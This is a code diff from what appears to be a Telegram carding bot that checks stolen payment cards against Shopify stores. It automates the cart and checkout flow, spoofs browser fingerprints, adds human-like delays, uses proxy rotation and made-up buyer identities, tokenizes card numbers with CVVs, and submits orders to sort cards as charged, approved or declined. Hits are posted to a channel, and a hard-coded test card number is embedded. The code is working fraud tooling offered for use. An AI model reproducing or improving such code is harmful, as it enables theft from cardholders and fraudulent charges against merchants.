+            if proxy_data and is_proxy_error(result.get("Response", "")):
+
+                rotator.report_proxy_fail(proxy_data.get('proxy_url'))
+
+        last = result
+
+        if attempt < max_retries - 1:
+
+            await asyncio.sleep(0.3)
+
+    if last:
+
+        last["Status"] = "Error"
+
+        return last
+
+    return {"Response": "Max retries", "Price": "-", "Gateway": "-", "Status": "Error", "card": card}
+
+
+
+async def test_site(site, proxy_data=None, http_session=None):
+
+    test_card = "5154623245618097|03|2032|156"
+
+    try:
+
+        url = build_api_url(site if site.startswith('http') else f'https://{site}', test_card, proxy_data)
+
+        s = http_session or (await get_user_http_session(0, "site"))
+
+        async with s.get(url) as resp:
+
+            if resp.status != 200:
+
+                return {'site': site, 'status': 'dead', 'price': '-', 'response': f'HTTP_{resp.status}', 'price_val': 999}
+
+            try:
+
+                raw = await resp.json(content_type=None)
+
+            except:
+
+                return {'site': site, 'status': 'dead', 'price': '-', 'response': 'Invalid JSON', 'price_val': 999}
+
+        rm = raw.get('Response', '')
+
+        price = raw.get('Price', '-')
+
+        price_val = 999.0
+
+        if price and price != '-':
+
+            try:
+
+                price_val = float(str(price).replace('$', '').strip())
+
+            except:
+
+                pass
+
+        if is_site_error(rm.lower()):
+
+            return {'site': site, 'status': 'dead', 'price': price, 'response': rm, 'price_val': price_val}
+
+        return {'site': site, 'status': 'alive', 'price': price, 'response': rm, 'price_val': price_val}
+
+    except Exception as e:
+
+        return {'site': site, 'status': 'dead', 'price': '-', 'response': str(e)[:50], 'price_val': 999}
+
+
+
+# ====================== CARD FORMATTING ======================
+
+def format_simple_card_result(status, card, gateway, response, bin_info=None, elapsed=0.0, extra_field=None):
+    sm = {
+        "Charged": (f"❤️‍🔥 <b>{bs('CHARGED')}</b> ❤️‍🔥", [CE["fire"]]),
+        "Approved": (f"✅ <b>{bs('APPROVED')}</b> ✅", [CE["check"]]),
+        "Declined": (f"❌ <b>{bs('DECLINED')}</b> ❌", [CE["declined"]]),
+        "Error": (f"⚠️ <b>{bs('ERROR')}</b> ⚠️", [CE["cross"]])
+    }
+    h, he = sm.get(status, sm["Declined"])
+    bi = bin_info or {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "-", "flag": "🏳️"}
+    extra = ""
+    if extra_field:
+        extra = f"💰 <b>{bs(extra_field[0])}</b> ━ <code>{extra_field[1]}</code>\n"
+    return f"""{h}
+<b>━━━━━━━━━━━━━━━━━</b>
+💳 <b>{bs('Card')}</b>
+⤷ <code>{card}</code>
+🌐 <b>{bs('Gateway')}</b> ━ <code>{gateway}</code>
+📝 <b>{bs('Response')}</b> ━ <code>{response}</code>
+{extra}<b>━━━━━━━━━━━━━━━━━</b>
+🔢 <b>{bs('BIN')}:</b> <code>{bi.get('brand', '-')} | {bi.get('type', '-')} | {bi.get('level', '-')}</code>
+🏦 <b>{bs('Bank')}:</b> <code>{bi.get('bank', '-')}</code>
+🌍 <b>{bs('Country')}:</b> <code>{bi.get('country', '-')} {bi.get('flag', '🏳️')}</code>
+<b>━━━━━━━━━━━━━━━━━</b>
+⏱️ <b>{bs('Took')}</b> ⏱ <code>{elapsed:.2f}{bs('s')}</code>
+𝗗𝗲𝘃 → sonik""", he
+
+
+def format_card_result(status, card, gateway, response, price="-", site="-", bin_info=None, elapsed=0.0):
+    sm = {
+        "Charged": (f"❤️‍🔥 <b>{bs('CHARGED')}</b> ❤️‍🔥", [CE["fire"]]),
+        "Approved": (f"✅ <b>{bs('APPROVED')}</b> ✅", [CE["check"]]),
+        "Declined": (f"❌ <b>{bs('DECLINED')}</b> ❌", [CE["declined"]]),
+        "Error": (f"⚠️ <b>{bs('ERROR')}</b> ⚠️", [CE["cross"]])
+    }
+    h, he = sm.get(status, sm["Declined"])
+    bi = bin_info or {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "-", "flag": "🏳️"}
+    ps = f"${str(price).replace('$', '')}" if price and price != "-" else "-"
+    return f"""{h}
+<b>━━━━━━━━━━━━━━━━━</b>
+💳 <b>{bs('Card')}</b>
+⤷ <code>{card}</code>
+🌐 <b>{bs('Gateway')}</b> ━ <code>{gateway}</code>
+📝 <b>{bs('Response')}</b> ━ <code>{response}</code>
+💰 <b>{bs('Price')}</b> ━ <code>{ps}</code>
+<b>━━━━━━━━━━━━━━━━━</b>
+🔢 <b>{bs('BIN')}:</b> <code>{bi.get('brand', '-')} | {bi.get('type', '-')} | {bi.get('level', '-')}</code>
+🏦 <b>{bs('Bank')}:</b> <code>{bi.get('bank', '-')}</code>
+🌍 <b>{bs('Country')}:</b> <code>{bi.get('country', '-')} {bi.get('flag', '🏳️')}</code>
+<b>━━━━━━━━━━━━━━━━━</b>
+⏱️ <b>{bs('Took')}</b> ⏱ <code>{elapsed:.2f}{bs('s')}</code>
+𝗗𝗲𝘃 → sonik""", he
+
+
+# ====================== HIT NOTIFICATIONS ======================
+
+async def send_channel_hit(res, uid, username, name):
+
+    try:
+
+        sv = str(res.get("Status", "Charged")).upper()
+
+        if sv in ["CHARGED", "APPROVED"]:
+            prof = f"https://t.me/{username}" if username and not username.startswith("user_") else f"tg://user?id={uid}"
+            gw = res.get('Gateway', 'Shopify')
+            resp = res.get('Response', '')
+            status_emoji = "❤️‍🔥" if sv == "CHARGED" else "✅"
+            msg = f"""{status_emoji} <b>{bs(sv)}</b> {status_emoji}
+<b>━━━━━━━━━━━━━━━━━</b>
+💳 <b>{bs('Card')}</b>
+⤷ <code>{res.get('Card', '-')}</code>
+🌐 <b>{bs('Gateway')}</b> ━ <code>{gw}</code>
+📝 <b>{bs('Response')}</b> ━ <code>{resp}</code>
+💰 <b>{bs('Price')}</b> ━ <code>{res.get('Price', '-')}</code>
+👤 <b>{bs('User')}</b> ━ <a href="{prof}">{name}</a>
+<b>━━━━━━━━━━━━━━━━━</b>
+𝗗𝗲𝘃 → sonik"""
+            HIT_BUTTON = [[Button.url("🚀 " + bs("Sonik"), f"https://t.me/{MAIN_BOT_USERNAME}")]]
+
+            await styled_send(HIT_CHANNEL_ID, msg, buttons=HIT_BUTTON, emoji_ids=[CE["fire"]])
+
+    except:
+
         pass
 
-    try:
-        cached = _get_cached_products(site)
-        if cached:
-            products = cached
-            _steps.append("1. Products: cached")
-        else:
-            product_response = await _retry_async_request(session.get, site + "/products.json", headers=product_header)
-            _steps.append(f"1. Products: HTTP {product_response.status_code}")
-            if product_response.status_code != 200:
-                return {"status": "Error", "message": f"Products page HTTP {product_response.status_code}", "debug_steps": _steps}
-            try:
-                products_data = product_response.json()
-            except Exception:
-                return {"status": "Error", "message": "Products page not JSON (site may be down)", "debug_steps": _steps}
-            products = products_data.get("products") or []
-            if products:
-                _set_cached_products(site, products)
-        if not products:
-            return {"status": "Error", "message": "No products found", "debug_steps": _steps}
         
-        lowest_price = None
-        lowest_product = None
-        lowest_variant = None
-        
-        for product in products:
-            variants = product.get("variants") or []
-            for v in variants:
-                available = v.get("available", True)
-                if isinstance(available, str):
-                    available = available.lower() in ("true", "1", "yes")
-                
-                if not available:
-                    continue
-                
-                price_str = v.get("price") or "0"
-                try:
-                    price_val = float(str(price_str).replace("$", "").replace(",", "").strip())
-                except (ValueError, TypeError):
-                    continue
-                
-                if price_val < 10.0 or price_val > 40.0:
-                    continue
-                
-                if lowest_price is None or price_val < lowest_price:
-                    lowest_price = price_val
-                    lowest_product = product
-                    lowest_variant = v
-        
-        if lowest_product is None or lowest_variant is None:
-            return {"status": "Error", "message": "No available products in price range", "debug_steps": _steps}
-        
-        product_handle = lowest_product["handle"]
-        variant_id = lowest_variant["id"]
-        price = lowest_variant["price"]
-        product_title = lowest_product["title"]
-        _steps.append(f"2. Product: {product_title[:40]} | ${price} | variant={variant_id}")
-        _log_verbose(verbose, f"✅ Product: {product_title[:40]} price={price}", discord_webhook=discord_console_webhook)
-    except Exception as e:
-        return {"status": "Error", "message": f"Product fetch: {str(e)[:100]}", "debug_steps": _steps}
-    try:
-        await asyncio.sleep(random.uniform(0.4, 1.2))
 
-        browse_headers = {k: v for k, v in product_header.items()}
-        browse_headers["Referer"] = site + "/"
-        browse_headers["Sec-Fetch-Dest"] = "document"
-        browse_headers["Sec-Fetch-Mode"] = "navigate"
-        browse_headers["Sec-Fetch-Site"] = "same-origin"
-        browse_headers["Sec-Fetch-User"] = "?1"
-        try:
-            await _retry_async_request(session.get, f"{site}/collections/all", headers=browse_headers)
-            await asyncio.sleep(random.uniform(0.3, 0.8))
-        except Exception:
-            pass
+# ====================== /start ======================
 
-        browse_headers["Referer"] = f"{site}/collections/all"
-        try:
-            await _retry_async_request(session.get, f"{site}/products/{product_handle}", headers=browse_headers)
-        except Exception:
-            pass
-
-        await asyncio.sleep(random.uniform(0.5, 1.5))
-
-        cart_add_headers = {k: v for k, v in product_header.items()}
-        cart_add_headers["Referer"] = f"{site}/products/{product_handle}"
-        cart_add_headers["Sec-Fetch-Dest"] = "empty"
-        cart_add_headers["Sec-Fetch-Mode"] = "cors"
-        cart_add_headers["Sec-Fetch-Site"] = "same-origin"
-        cart_add_headers["content-type"] = "application/x-www-form-urlencoded"
-        cart_add_headers["origin"] = site
-        cart_add_headers["X-Requested-With"] = "XMLHttpRequest"
-        cart_add_headers.pop("Sec-Fetch-User", None)
-        cart_add_headers.pop("Upgrade-Insecure-Requests", None)
-
-        add_data = {"id": str(variant_id), "quantity": "1", "form_type": "product"}
-        response = await _retry_async_request(session.post, site + "/cart/add.js", headers=cart_add_headers, data=add_data)
-        if response.status_code != 200:
-            return {"status": "Error", "message": "Cart add failed", "debug_steps": _steps}
-        _steps.append(f"3. Cart add: HTTP {response.status_code}")
-        _log_verbose(verbose, "✅ Cart add OK", discord_webhook=discord_console_webhook)
-
-        await asyncio.sleep(random.uniform(0.3, 0.8))
-        cart_response = await _retry_async_request(session.get, f"{site}/cart.js", headers=cart_add_headers)
-        try:
-            cart_data = cart_response.json()
-        except Exception:
-            return {"status": "Error", "message": "Cart JSON parse failed", "debug_steps": _steps}
-        token = cart_data.get("token")
-        if not token:
-            return {"status": "Error", "message": "No cart token", "debug_steps": _steps}
-    except _NETWORK_ERRORS as e:
-        return {"status": "Error", "message": f"Network: {type(e).__name__}"}
-
-    await asyncio.sleep(random.uniform(0.5, 1.2))
-
-    checkout_headers = {
-        "User-Agent": fingerprint.get("User-Agent", shop.user_agent),
-        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
-        "Accept-Language": fingerprint.get("Accept-Language", "en-US,en;q=0.9"),
-        "Accept-Encoding": "gzip, deflate, br, zstd",
-        "content-type": "application/x-www-form-urlencoded",
-        "origin": site,
-        "referer": f"{site}/cart",
-        "Sec-Fetch-Dest": "document",
-        "Sec-Fetch-Mode": "navigate",
-        "Sec-Fetch-Site": "same-origin",
-        "Sec-Fetch-User": "?1",
-        "Upgrade-Insecure-Requests": "1",
-        "Cache-Control": "max-age=0",
-        "Connection": "keep-alive",
-    }
-    for _ch_key in ("Sec-Ch-Ua", "Sec-Ch-Ua-Mobile", "Sec-Ch-Ua-Platform", "Sec-Ch-Ua-Full-Version-List"):
-        if _ch_key in fingerprint:
-            checkout_headers[_ch_key] = fingerprint[_ch_key]
-    try:
-        checkout_response = await _retry_async_request(session.post, f"{site}/cart", headers=checkout_headers, data={"checkout": "", "updates[]": "1"})
-    except _NETWORK_ERRORS as e:
-        return {"status": "Error", "message": f"Network: {type(e).__name__}", "debug_steps": _steps}
-    checkout_page_url = str(checkout_response.url)
-    response_text2 = checkout_response.text
-    x_st = _RE_SESSION_TOKEN.search(response_text2)
-    session_token = x_st.group(1) if x_st else None
-    if not session_token:
-        return {"status": "Error", "message": "Checkout session failed", "debug_steps": _steps}
-    _steps.append(f"4. Checkout: HTTP {checkout_response.status_code} | url={checkout_page_url[:60]}")
-    _log_verbose(verbose, "✅ Checkout session OK", discord_webhook=discord_console_webhook)
-    queue_token = find_between(response_text2, 'queueToken&quot;:&quot;', '&quot;')
-    stable_id = find_between(response_text2, 'stableId&quot;:&quot;', '&quot;')
-    paymentMethodIdentifier = find_between(response_text2, 'paymentMethodIdentifier&quot;:&quot;', '&quot;')
-    _checkpoint_token = find_between(response_text2, 'checkpointToken&quot;:&quot;', '&quot;')
-    if not _checkpoint_token:
-        _checkpoint_token = find_between(response_text2, 'captchaToken&quot;:&quot;', '&quot;')
-    if not _checkpoint_token:
-        _checkpoint_token = find_between(response_text2, '"checkpointToken":"', '"')
-    _checkpoint_data = {"token": _checkpoint_token} if _checkpoint_token else None
-    delivery_line_stable_id = _extract_delivery_line_stable_id(response_text2)
-    requires_shipping = _detect_requires_shipping(response_text2)
-    if requires_shipping is None:
-        requires_shipping = True
-    delivery_strategy_handle = _extract_delivery_strategy_handle(response_text2)
-    delivery_option_handle = None
-    _log_verbose(verbose, f"✅ requires_shipping={requires_shipping}, delivery_strategy_handle={delivery_strategy_handle[:20] + '...' if delivery_strategy_handle else None}", discord_webhook=discord_console_webhook)
-    random_info = shop.get_random_info()
-    fname, lname = random_info["fname"], random_info["lname"]
-    email, phone = random_info["email"], random_info["phone"]
-    add1 = random_info["add1"]
-    city = random_info["city"]
-    state_short = random_info["state_short"]
-    zip_code = str(random_info["zip"])
-
-    await asyncio.sleep(random.uniform(1.0, 2.5))
-
-    _token_endpoints = ["https://deposit.us.shopifycs.com/sessions", "https://checkout.pci.shopifyinc.com/sessions", "https://checkout.shopifycs.com/sessions"]
-    _card_json = {"credit_card": {"number": cc, "month": mon, "year": year, "verification_value": cvv, "name": f"{fname} {lname}"}, "payment_session_scope": urlparse(site_url).netloc}
-    _tok_chrome_ver = fingerprint.get("_chrome_ver")
-    _tok_headers = {"accept": "application/json", "content-type": "application/json", "origin": "https://checkout.shopifycs.com", "referer": "https://checkout.shopifycs.com/", "user-agent": shop.user_agent, "accept-language": fingerprint.get("Accept-Language", "en-US,en;q=0.9"), "accept-encoding": "gzip, deflate, br, zstd", "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "cross-site"}
-    for _ch_key in ("Sec-Ch-Ua", "Sec-Ch-Ua-Mobile", "Sec-Ch-Ua-Platform"):
-        if _ch_key in fingerprint:
-            _tok_headers[_ch_key.lower()] = fingerprint[_ch_key]
-
-    async def _try_tokenize_sequential(endpoints, px=None):
-        try:
-            async with _create_async_client(proxy_url=px, timeout=15.0, chrome_version=_tok_chrome_ver) as tok_sess:
-                for ep in endpoints:
-                    try:
-                        r = await tok_sess.post(ep, headers=_tok_headers, json=_card_json)
-                        if r.status_code == 200:
-                            sid = r.json().get("id")
-                            if sid:
-                                return sid
-                    except Exception:
-                        continue
-        except Exception:
-            pass
-        return None
-
-    async def _tokenize_card():
-        sid = await _try_tokenize_sequential(_token_endpoints, px=None)
-        if sid:
-            return sid
-        if proxy_url:
-            sid = await _try_tokenize_sequential(_token_endpoints, px=proxy_url)
-            if sid:
-                return sid
-        return None
-
-    sessionid = await _tokenize_card()
-    if not sessionid:
-        return {"status": "Error", "message": "Payment session failed", "debug_steps": _steps}
-    _steps.append(f"5. Payment session: OK | sid={sessionid[:20]}...")
-    _log_verbose(verbose, "✅ Payment session OK", discord_webhook=discord_console_webhook)
-    graphql_url = f"{site_url}/checkouts/unstable/graphql"
-    _query = "mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{errors{...on NegotiationError{code localizedMessage __typename}__typename}__typename}...on Throttled{pollAfter pollUrl queueToken __typename}...on CheckpointDenied{redirectUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token __typename}...on ProcessingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id __typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}__typename}__typename}__typename}"
-
-    def _make_graphql_headers():
-        h = {"accept": "application/json", "content-type": "application/json", "origin": site_url, "referer": f"{site_url}/", "user-agent": shop.user_agent, "accept-language": fingerprint.get("Accept-Language", "en-US,en;q=0.9"), "accept-encoding": "gzip, deflate, br, zstd", "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-origin", "x-checkout-one-session-token": session_token, "x-checkout-web-deploy-stage": "production", "x-checkout-web-server-handling": "fast", "x-checkout-web-source-id": token.split("?")[0] if "?" in token else token}
-        for _ch_key in ("Sec-Ch-Ua", "Sec-Ch-Ua-Mobile", "Sec-Ch-Ua-Platform", "Sec-Ch-Ua-Full-Version-List"):
-            if _ch_key in fingerprint:
-                h[_ch_key] = fingerprint[_ch_key]
-        return h
-
-    def _delivery_kwargs():
-        return dict(requires_shipping=requires_shipping, delivery_strategy_handle=delivery_strategy_handle, delivery_option_handle=delivery_option_handle)
-
-    neg_got_receipt = False
-    await asyncio.sleep(random.uniform(0.8, 1.8))
-    if requires_shipping:
-        _log_verbose(verbose, "✅ Negotiating shipping rates...", discord_webhook=discord_console_webhook)
-        neg_page_id = f"{random.randint(10000000, 99999999):08x}-{random.randint(1000, 9999):04X}-{random.randint(1000, 9999):04X}-{random.randint(1000, 9999):04X}-{random.randint(100000000000, 999999999999):012x}"
-        neg_payload = {
-            "query": _query,
-            "variables": {
-                "input": {
-                    "checkpointData": _checkpoint_data,
-                    "sessionInput": {"sessionToken": session_token},
-                    "queueToken": queue_token,
-                    "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
-                    "delivery": _build_delivery_payload(stable_id, delivery_line_stable_id, add1, city, zip_code, fname, lname, state_short, phone, destination_changed=True, **_delivery_kwargs()),
-                    "merchandise": {
-                        "merchandiseLines": [{
-                            "stableId": stable_id,
-                            "quantity": {"items": {"value": 1}},
-                            "expectedTotalPrice": {"any": True},
-                            "merchandise": {
-                                "productVariantReference": {"id": f"gid://shopify/ProductVariantMerchandise/{variant_id}", "variantId": f"gid://shopify/ProductVariant/{variant_id}", "properties": [], "sellingPlanId": None, "sellingPlanDigest": None},
-                            },
-                            "lineComponentsSource": None,
-                            "lineComponents": [],
-                        }],
-                    },
-                    "payment": {
-                        "totalAmount": {"any": True},
-                        "paymentLines": [{
-                            "paymentMethod": {
-                                "directPaymentMethod": {
-                                    "paymentMethodIdentifier": paymentMethodIdentifier,
-                                    "sessionId": sessionid,
-                                    "billingAddress": {"streetAddress": {"address1": add1, "address2": "", "city": city, "countryCode": "US", "postalCode": zip_code, "company": "", "firstName": fname, "lastName": lname, "zoneCode": state_short, "phone": phone}},
-                                },
-                            },
-                            "amount": {"any": True},
-                            "dueAt": None,
-                        }],
-                        "billingAddress": {"streetAddress": {"address1": add1, "address2": "", "city": city, "countryCode": "US", "postalCode": zip_code, "company": "", "firstName": fname, "lastName": lname, "zoneCode": state_short, "phone": phone}},
-                    },
-                    "buyerIdentity": {"buyerIdentity": {"presentmentCurrency": "USD", "countryCode": "US"}, "contactInfoV2": {"emailOrSms": {"value": email, "emailOrSmsChanged": False}}, "marketingConsent": [{"email": {"value": email}}], "shopPayOptInPhone": {"countryCode": "US"}},
-                    "tip": {"tipLines": []},
-                    "taxes": {"proposedAllocations": None, "proposedTotalAmount": {"value": {"amount": "0", "currencyCode": "USD"}}, "proposedTotalIncludedAmount": None, "proposedMixedStateTotalAmount": None, "proposedExemptions": []},
-                    "note": {"message": None, "customAttributes": []},
-                    "localizationExtension": {"fields": []},
-                    "nonNegotiableTerms": None,
-                    "scriptFingerprint": {"signature": None, "signatureUuid": None, "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": []},
-                    "optionalDuties": {"buyerRefusesDuties": False},
-                },
-                "attemptToken": f"{token}-neg-{random.random()}",
-                "metafields": [],
-                "analytics": {"requestUrl": f"{site_url}/checkouts/cn/{token}", "pageId": neg_page_id},
-            },
-            "operationName": "SubmitForCompletion",
-        }
-        neg_resp = await session.post(graphql_url, headers=_make_graphql_headers(), json=neg_payload)
-        if neg_resp.status_code == 200:
-            neg_data = neg_resp.json()
-            neg_completion = neg_data.get("data", {}).get("submitForCompletion", {}) or {}
-            neg_receipt = neg_completion.get("receipt")
-            if neg_receipt and neg_receipt.get("id"):
-                neg_got_receipt = True
-                _log_verbose(verbose, "✅ Negotiation returned receipt directly!", discord_webhook=discord_console_webhook)
-            else:
-                _log_verbose(verbose, "✅ Shipping negotiated", discord_webhook=discord_console_webhook)
-        else:
-            _log_verbose(verbose, f"⚠️ Negotiation HTTP {neg_resp.status_code}, continuing...", discord_webhook=discord_console_webhook)
-
-        if neg_got_receipt:
-            receipt = neg_receipt
-            receipt_id = receipt.get("id")
-            if receipt.get("__typename") == "ProcessingReceipt":
-                poll_delay = 0.25
-                for poll_i in range(8):
-                    await asyncio.sleep(min(poll_delay + poll_i * 0.06, 0.7))
-                    poll_r = await session.post(graphql_url, headers=_make_graphql_headers(), json={"query": "query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl orderIdentity{buyerIdentifier id __typename}__typename}...on ProcessingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}__typename}__typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}__typename}__typename}__typename}", "variables": {"receiptId": receipt_id, "sessionToken": session_token}, "operationName": "PollForReceipt"})
-                    if poll_r.status_code != 200:
-                        continue
-                    rec = poll_r.json().get("data", {}).get("receipt", {})
-                    if rec.get("__typename") == "ProcessedReceipt" or rec.get("orderIdentity"):
-                        return {"status": "Charged", "message": "CARD CHARGED", "order_id": rec.get("orderIdentity", {}).get("id"), "product": product_title, "price": price, "raw_receipt": rec}
-                    if rec.get("__typename") == "ActionRequiredReceipt":
-                        return {"status": "Approved", "message": "3DS Required", "error_code": "3DS_REQUIRED", "product": product_title, "price": price, "raw_receipt": rec}
-                    if rec.get("__typename") == "FailedReceipt":
-                        err = rec.get("processingError", {}) or {}
-                        _fc = err.get("code", "UNKNOWN")
-                        if _fc == "CAPTCHA_REQUIRED":
-                            return {"status": "Error", "message": "CAPTCHA Required", "error_code": "CAPTCHA_REQUIRED", "product": product_title, "price": price, "raw_receipt": rec}
-                        return {"status": "Declined", "message": "Card declined", "error_code": _fc, "gateway_message": err.get("messageUntranslated", "") or None, "product": product_title, "price": price, "raw_receipt": rec}
-                return {"status": "Error", "message": "Poll timeout", "product": product_title, "price": price}
-            elif receipt.get("__typename") == "FailedReceipt":
-                err = receipt.get("processingError", {}) or {}
-                _fc = err.get("code", "UNKNOWN")
-                if _fc == "CAPTCHA_REQUIRED":
-                    return {"status": "Error", "message": "CAPTCHA Required", "error_code": "CAPTCHA_REQUIRED", "product": product_title, "price": price, "raw_receipt": receipt}
-                return {"status": "Declined", "message": "Card declined", "error_code": _fc, "gateway_message": err.get("messageUntranslated", "") or None, "product": product_title, "price": price, "raw_receipt": receipt}
-            elif receipt.get("__typename") == "ProcessedReceipt" or receipt.get("orderIdentity"):
-                return {"status": "Charged", "message": "CARD CHARGED", "order_id": receipt.get("orderIdentity", {}).get("id"), "product": product_title, "price": price, "raw_receipt": receipt}
-
-        try:
-            ref = await session.get(checkout_page_url, headers={"User-Agent": shop.user_agent, "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"})
-            if ref.status_code == 200:
-                rt = ref.text
-                nst = _RE_SESSION_TOKEN.search(rt)
-                if nst:
-                    session_token = nst.group(1)
-                nq = find_between(rt, 'queueToken&quot;:&quot;', '&quot;')
-                if nq:
-                    queue_token = nq
-                ns = find_between(rt, 'stableId&quot;:&quot;', '&quot;')
-                if ns:
-                    stable_id = ns
-                np_ = find_between(rt, 'paymentMethodIdentifier&quot;:&quot;', '&quot;')
-                if np_:
-                    paymentMethodIdentifier = np_
-                nd = _extract_delivery_line_stable_id(rt)
-                if nd:
-                    delivery_line_stable_id = nd
-                nds = _extract_delivery_strategy_handle(rt)
-                if nds:
-                    delivery_strategy_handle = nds
-                _log_verbose(verbose, "✅ Tokens refreshed after negotiation", discord_webhook=discord_console_webhook)
-        except Exception as e:
-            _log_verbose(verbose, f"⚠️ Re-fetch warning: {e}", discord_webhook=discord_console_webhook)
-
-        new_sid = await _tokenize_card()
-        if new_sid:
-            sessionid = new_sid
-            _log_verbose(verbose, "✅ Payment session refreshed after negotiation", discord_webhook=discord_console_webhook)
-        else:
-            _log_verbose(verbose, "⚠️ Re-tokenize failed, using original session", discord_webhook=discord_console_webhook)
+@client.on(events.NewMessage(pattern=r'(?i)^[/.](getid)$'))
+async def get_emoji_id(event):
+    if not event.reply_to_msg_id:
+        return await event.reply("❌ Reply to a message containing the premium emoji you want.")
+    msg = await event.get_reply_message()
+    if not msg.entities:
+        return await event.reply("❌ No entities found in this message.")
+    
+    found = False
+    res = "📊 **Found Premium Emojis:**\n"
+    for ent in msg.entities:
+        if isinstance(ent, MessageEntityCustomEmoji):
+            res += f"🔹 ID: ` {ent.document_id} `\n"
+            found = True
+    
+    if found:
+        await event.reply(res)
     else:
-        _log_verbose(verbose, "✅ Digital product (no shipping needed)", discord_webhook=discord_console_webhook)
+        await event.reply("❌ No premium emojis detected in that message.")
 
-    _max_submit_attempts = 1
-    for attempt in range(_max_submit_attempts):
-        graphql_headers = _make_graphql_headers()
-        random_page_id = f"{random.randint(10000000, 99999999):08x}-{random.randint(1000, 9999):04X}-{random.randint(1000, 9999):04X}-{random.randint(1000, 9999):04X}-{random.randint(100000000000, 999999999999):012x}"
-        graphql_payload = {
-            "query": _query,
-            "variables": {
-                "input": {
-                    "checkpointData": _checkpoint_data,
-                    "sessionInput": {"sessionToken": session_token},
-                    "queueToken": queue_token,
-                    "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
-                    "delivery": _build_delivery_payload(stable_id, delivery_line_stable_id, add1, city, zip_code, fname, lname, state_short, phone, destination_changed=False, **_delivery_kwargs()),
-                    "merchandise": {
-                        "merchandiseLines": [{
-                            "stableId": stable_id,
-                            "quantity": {"items": {"value": 1}},
-                            "expectedTotalPrice": {"any": True},
-                            "merchandise": {
-                                "productVariantReference": {"id": f"gid://shopify/ProductVariantMerchandise/{variant_id}", "variantId": f"gid://shopify/ProductVariant/{variant_id}", "properties": [], "sellingPlanId": None, "sellingPlanDigest": None},
-                            },
-                            "lineComponentsSource": None,
-                            "lineComponents": [],
-                        }],
-                    },
-                    "payment": {
-                        "totalAmount": {"any": True},
-                        "paymentLines": [{
-                            "paymentMethod": {
-                                "directPaymentMethod": {
-                                    "paymentMethodIdentifier": paymentMethodIdentifier,
-                                    "sessionId": sessionid,
-                                    "billingAddress": {"streetAddress": {"address1": add1, "address2": "", "city": city, "countryCode": "US", "postalCode": zip_code, "company": "", "firstName": fname, "lastName": lname, "zoneCode": state_short, "phone": phone}},
-                                },
-                            },
-                            "amount": {"any": True},
-                            "dueAt": None,
-                        }],
-                        "billingAddress": {"streetAddress": {"address1": add1, "address2": "", "city": city, "countryCode": "US", "postalCode": zip_code, "company": "", "firstName": fname, "lastName": lname, "zoneCode": state_short, "phone": phone}},
-                    },
-                    "buyerIdentity": {"buyerIdentity": {"presentmentCurrency": "USD", "countryCode": "US"}, "contactInfoV2": {"emailOrSms": {"value": email, "emailOrSmsChanged": False}}, "marketingConsent": [{"email": {"value": email}}], "shopPayOptInPhone": {"countryCode": "US"}},
-                    "tip": {"tipLines": []},
-                    "taxes": {"proposedAllocations": None, "proposedTotalAmount": {"any": True}, "proposedTotalIncludedAmount": None, "proposedMixedStateTotalAmount": None, "proposedExemptions": []},
-                    "note": {"message": None, "customAttributes": []},
-                    "localizationExtension": {"fields": []},
-                    "nonNegotiableTerms": None,
-                    "scriptFingerprint": {"signature": None, "signatureUuid": None, "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": []},
-                    "optionalDuties": {"buyerRefusesDuties": False},
-                },
-                "attemptToken": f"{token}-{random.random()}",
-                "metafields": [],
-                "analytics": {"requestUrl": f"{site_url}/checkouts/cn/{token}", "pageId": random_page_id},
-            },
-            "operationName": "SubmitForCompletion",
-        }
-        _log_verbose(verbose, f"✅ Submit attempt {attempt + 1}/{_max_submit_attempts}", discord_webhook=discord_console_webhook)
-        gr = await session.post(graphql_url, headers=graphql_headers, json=graphql_payload)
-        _steps.append(f"6. Submit #{attempt+1}: HTTP {gr.status_code}")
-        if gr.status_code != 200:
-            last_completion = {"__typename": "HttpError", "status": gr.status_code}
-            return {"status": "Error", "message": f"GraphQL {gr.status_code}", "debug_steps": _steps}
-        result_data = gr.json()
-        completion = result_data.get("data", {}).get("submitForCompletion", {}) or {}
-        last_completion = completion
-        top_errors = result_data.get("errors")
-        if top_errors:
-            last_graphql_errors = top_errors
-            if verbose:
-                _log_verbose(verbose, f"GraphQL errors: {top_errors[:2]}", discord_webhook=discord_console_webhook)
-        if completion.get("errors"):
-            error_codes = [e.get("code") for e in completion["errors"] if e.get("code")]
+@client.on(events.NewMessage(pattern=r'(?i)^[/.](start|cmds?|commands?)$'))
 
-            _approval_codes = {
-                "PAYMENTS_CREDIT_CARD_BASE_INSUFFICIENT_FUNDS",
-                "PAYMENTS_CREDIT_CARD_BASE_INVALID_CVC",
-                "PAYMENTS_CREDIT_CARD_BASE_EXPIRED",
-            }
-            _decline_codes = {
